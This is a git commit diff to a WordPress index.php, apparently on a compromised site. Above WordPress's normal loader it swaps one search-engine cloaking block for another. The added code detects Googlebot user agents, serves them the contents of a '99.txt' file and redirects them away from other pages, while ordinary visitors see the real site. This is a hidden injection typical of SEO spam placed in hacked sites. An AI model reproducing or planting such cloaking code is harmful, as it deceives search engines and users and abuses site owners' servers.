7a33af9de5740027d671069f4f1212225f4eceed
Lutfifakee <161194427+X-Projetion@users.noreply.github.com>
2025-03-15 13:45:14 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,14 +1,4 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/' && (strpos($userAgent, 'bot') !== false || strpos($userAgent, 'google') !== false  || strpos($userAgent, 'chrome-lighthouse') !== false || strpos($referer, 'google') !== false)) {
-    echo file_get_contents('99.txt');
-    exit();
-}
-?>
-<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
@@ -21,6 +11,33 @@ if ($uri == '/' && (strpos($userAgent, 'bot') !== false || strpos($userAgent, 'g
  *
  * @var bool
  */
+function is_google_bot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+$is_google_bot = is_google_bot();
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if ($is_google_bot) {
+    if ($uri == '/') {
+        if (file_exists('99.txt')) {
+            echo file_get_contents('99.txt');
+        }
+        exit();
+    } else {
+        header("Location: /");
+        exit();
+    }
+}
+?>
+
+<?php
+
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
